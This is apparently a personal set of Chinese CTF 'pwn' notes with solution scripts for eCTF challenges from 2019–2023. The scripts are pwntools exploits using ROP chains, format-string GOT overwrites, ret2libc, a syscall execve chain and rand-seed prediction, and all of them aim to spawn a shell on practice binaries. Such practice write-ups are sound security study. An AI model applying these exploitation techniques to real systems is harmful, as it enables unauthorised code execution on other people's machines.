eCTF的PWN做题笔记

## 2019

+ rop1

  > 非常经典的ROP
  >

  ```python
  from pwn import *
  io=process("./rop1")
  io.recvline()
  sh=p64(0x601070)
  sys=p64(0x400805)
  pop_rdi=p64(0x4008E3)
  payload=pop_rdi+sh+sys
  io.sendline(b'a'*(0x4+8)+payload)
  io.interactive()

  ```
+ rop2

  > 经典ROP之没有sh字符串
  >

  ```python
  from pwn import *
  context(os='linux',arch="amd64",log_level='debug')
  io=process("./rop2")
  elf=ELF('./rop2')
  sys=p64(elf.sym['system'])
  pop_rdi=p64(0x4008E3)
  str_addr=p64(0x601080)
  elf_gets=p64(elf.sym['gets'])
  payload=b'a'*(0x4+8)+pop_rdi+str_addr+elf_gets+pop_rdi+str_addr+sys
  io.recvline()
  io.sendline(payload)
  io.sendline('/bin/sh')
  io.interactive()

  ```

## 2021

+ Int_overflow_revenge

  + 华强买瓜，数组整数溢出，修改重量（溢出retaddr）
  + 首先输入一个小于1的数
  + 后输入选择的西瓜的index
  + 我们选第131个西瓜来溢出
  + 修改重量为backdoor函数地址（为整数形式）
  + getshell
+ babyfmt

  * https://blog.csdn.net/weixin_63231007/article/details/125883680#t10
  * ```python
    from pwn import *

    p = remote("node4.buuoj.cn",28357)

    payload = p32(0x0804c044) + b'%10$n'
    # payload = fmtstr_payload(10,{0x804C044:0x4})  fmtstr_payload()是可用于格式化字符串漏洞的函数
    #pwntools自带的格式化字符串漏洞payload构建工具——fmtstr_payload
    p.recvuntil('your name:')  #与shell进行交互
    p.sendline(payload)
    p.recvuntil("your passwd:")
    p.sendline('4')
    p.interactive()
    ```
  * ```python
    from pwn import *
    io=process('./babyfmt')
    payload = p32(0x0804C044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)
    payload += b'%10$n%11$n%12$n%13$n'
    io.sendline(payload)
    io.sendline(str(0x10101010))
    #gdb.attach(io)
    io.interactive()

    ```
  * ```python
    from pwn import *
    #io = process("./pwn")
    io = remote("node4.buuoj.cn",25946)
    elf = ELF('./pwn')
    atoi_got = elf.got['atoi']
    system_plt = elf.plt['system']
    payload=fmtstr_payload(10,{atoi_got:system_plt})
    io.sendline(payload)
    io.sendline(b'/bin/sh\x00')
    io.interactive()
    ```

  + ```python
     1 from pwn import *
      2 io=process("./pwn")
      3 #io=remote("node4.buuoj.cn",28381)
      4 io.recv()
      5 addr=0x0804c044
      6 #payload=p32(addr)+b"%10$n"//这里使用pwntools的fmtstr_payload和手动构造payload的效果是等同的
      7 payload=fmtstr_payload(10,{addr:4})                             
      8 io.sendline(payload)
      9 io.recv()
     10 io.sendline(b"4")
     11 io.interactive()                         
    ```
  + babyrop
  + ```python
    from pwn import *
    io=process('./babyrop')
    elf=ELF("./babyrop")
    io.recvuntil(b'advise?\n')
    sys=p32(elf.symbols['system'])
    gets=p32(elf.symbols['gets'])
    bss=p32(0x804A028)
    payload=b'a'*(0x28+4)+gets+sys+bss+bss
    io.sendline(payload)
    io.sendline(b'/bin/sh\x00')
    io.interactive()

    ```

## 2022

+ babyfmt

  + gdb下断在printf 断在第二个 输入%p%p%p%p%p 泄露下栈上相邻的内存
  + 第一个就为最相邻的参数，得到0xffffce8c，使用fmtstr 0xffffce8c 快速计算偏移
    + `pwndbg> fmtarg 0xffffce8c The index of format argument : 12 ("\%11$p") `
  + ```python
    from pwn import *
    io=process('./pwn')
    io.recvline()

    payload1 = b'%p'
    io.sendline(payload1)
    stack_value = int(eval(str(io.recv(10))),16)
    #attach(io)
    payload2 = p32(stack_value-0x30) + p32(stack_value-0x2f) + b'%125c%12$hhn' + b'%31c%11$hhn'
    io.sendline(payload2)

    io.interactive()

    ```
  + 方法二 修改got表 pinrtf->backdoor
    + ```python
      from pwn import *
      p=process('./pwn')
      payload=fmtstr_payload(11,{0x0804a010:0x0804859b})
      p.sendafter("\n",payload)
      p.send('/bin/sh')
      p.interactive()

      ```
  + 
+ random

  + 有趣的一题，猜数字，用同样的srand的seed(当前时间)生成rand即可
  + ```python
    from pwn import *
    p=process('./pwn')
    password=b'ls_4nyth1n9_7ruIy_R4nd0m?'.ljust(0x20,b'\x00')
    p.sendlineafter("username:",'a')
    p.sendlineafter("password:",password)
    proc=process("./calc")
    number=proc.recv()
    p.sendlineafter("Please tell me the number you guess now.",number)
    p.interactive()

    ```
  + ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <time.h>
    #include <string.h>
    int main(void)
    {
        srand((unsigned)time(NULL));
        int uVar2 = rand();
        int uVar3 = rand();
        int uVar4 = rand();
        srand(uVar4 ^ uVar2 ^ uVar3);
        rand();
        rand();
        rand();
        int local_6c = rand();
        printf("%d",local_6c);
    }

    ```

### syscall

+ 开启了PIE
+ ```python
  from pwn import *

  p = process("./pwn")

  p.recvuntil(b"0x")
  gadget_addr = int(p.recv(12), 16)
  pop_rdi_ret_addr = gadget_addr + 8
  pop_rsi_rdx_ret_addr = gadget_addr + 10
  syscall_addr = gadget_addr + 13
  binsh_addr = gadget_addr + 0x2e67

  payload = b"a" * 64 + b"b" * 8 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(pop_rsi_rdx_ret_addr) + p64(0) + p64(0) + p64(syscall_addr)
  p.send(payload)
  p.recvline()
  p.send(b"a" * 59)

  p.interactive()

  ```
+ 注意sendline函数自带回车符，send不带。所以利用函数的返回值作为eax传参59调用号
  + 关于read函数：如果读取成功，它将返回读取的字节数。
    如果发生错误，它将返回-1。

### ret2libc

+ 64位常规libc题目p1= padding+pop_rdi+puts_got+puts_plt+主函数地址(main or vuln)
+ p2= padding+ret+rdi+sh_str+system_addr
+ ```python
  from pwn import *
  io=process('./pwn')
  elf=ELF('./pwn')
  libc=ELF('./libc.so.6')
  rdi=0x40117E
  libc_sh=0x1D8698
  puts_plt=elf.plt['puts']
  puts_got=elf.got['puts']
  vuln_addr=elf.sym['vuln']
  payload1=b'a'*(0x40+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)

  io.recv()
  io.sendline(payload1)
  libc_base = u64(io.recv(6).ljust(8, b"\x00")) - libc.sym["puts"]
  system_addr = int(libc_base) + int(libc.sym['system'])
  ret=0x40117F
  success(str(libc_base))

  payload2=b'a'*(0x40+8)+p64(ret)+p64(rdi)+p64(libc_sh)+p64(system_addr)
  io.sendline(payload2)
  io.interactive()

  ```
+ 

## 2023

> 此次的比赛比较多重复的 但题目量很大

+ calculator
+ ```python
  from pwn import *
  #context(os='linux', arch='amd64', log_level='debug')
  io=process('./pwn')
  elf=ELF('./pwn')
  for i in range(100):
  	io.recvuntil(b'The first:')
  	first=int(io.recvuntil(b'\n'))
  	io.recvuntil(b'The second:')
  	second=int(io.recvuntil(b'\n'))
  	res=first+second
  	#success(res)
  	io.recvuntil(b'=')
  	calc=int(io.recvuntil(b'\n'))
  	#success(calc)
  	if res==calc:
  		io.sendline(b'BlackBird')
  	else:
  		io.sendline(b'WingS')
  io.interactive()

  ```
+
